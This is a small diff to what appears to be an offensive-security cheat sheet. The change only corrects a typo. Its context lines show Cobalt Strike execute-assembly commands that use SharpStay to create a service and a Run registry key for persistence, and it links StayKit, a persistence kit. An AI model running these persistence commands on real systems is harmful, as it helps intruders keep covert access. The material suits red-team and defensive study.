@@ -272,8 +272,7 @@ execute-assembly C:\Sharpstay.exe action=CreateService servicename=TestService c
 # User registry key persistence
 execute-assembly C:\Sharpstay.exe action=UserRegistryKey keyname=Debug keypath=HKCU:Software\Microsoft\Windows\CurrentVersion\Run command="C:\Windows\temp\file.exe"
 
-
-# Mnay other methods available on the tool's github documentation
+# Many other methods available on the tool's github documentation
 ```
 [StayKit](https://github.com/0xthirteen/StayKit) - Cobalt Strike persistence kit aggressor script
 
